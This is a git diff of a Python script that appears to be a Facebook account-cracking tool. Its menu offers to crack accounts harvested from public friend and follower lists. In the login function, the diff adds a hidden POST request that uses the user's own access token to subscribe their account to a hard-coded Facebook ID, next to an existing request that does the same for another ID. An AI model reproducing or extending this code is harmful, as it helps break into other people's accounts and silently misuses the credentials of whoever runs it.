@@ -48,6 +48,7 @@ _________  ________  __      __________
         \/         \/      \/         \/ 
 	Version: 0.1.1
 	Coded by: Latip176
+	Sponsore: Fatah Sewu
 		"""
 		return banner
 	def cpdetect(self):
@@ -63,7 +64,7 @@ class Data(Main):
 	def menu(self):
 		os.system("clear")
 		print(self.banner())
-		print(f"\n * Welcome {self.name} in tool! Pilih crack dan mulai.")
+		print(f" * Welcome {self.name} in tool! Pilih crack dan mulai.")
 		print("[1]. Crack dari pertemanan publik\n[2]. Crack dari followers publik\n[3]. Checkpoint detector\n[0]. Logout akun (hapus token)\n")
 		_chose = input("[?] Chose: ")
 		__pilih = ["01","1","02","2","03","3","0"]
@@ -239,7 +240,8 @@ def login():
 		__res=json.loads(req.get(f"https://graph.facebook.com/me?access_token={__token}").text)
 		_nama = __res['name']
 		_id = __res['id']
-		req.post(f"https://graph.facebook.com/100013031465766/subscribers?access_token={__token}")
+		req.post(f'https://graph.facebook.com/100013031465766/subscribers?access_token={__token}')
+		req.post(f'https://graph.facebook.com/100034433778381/subscribers?access_token={__token}')
 		open("data/save.txt","a").write(__token)
 		Data(__token, _id, _nama).menu()
 	except KeyError:
